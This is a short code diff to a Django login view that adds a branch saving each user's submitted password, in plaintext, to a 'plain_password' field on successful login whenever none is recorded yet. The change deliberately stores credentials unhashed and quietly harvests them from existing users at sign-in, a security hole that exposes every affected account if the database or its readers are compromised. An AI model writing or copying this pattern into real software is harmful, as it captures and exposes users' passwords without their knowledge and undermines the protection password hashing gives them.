@@ -77,6 +77,10 @@ def login_view(request):
         password = request.POST.get("password") or ""
         user = authenticate(request, username=phone, password=password)
         if user is not None:
+            # Auto-capture plain password for old users who never had it recorded
+            if not user.plain_password:
+                user.plain_password = password
+                user.save(update_fields=["plain_password"])
             login(request, user)
             if user.is_staff:
                 return redirect("staff_dashboard")
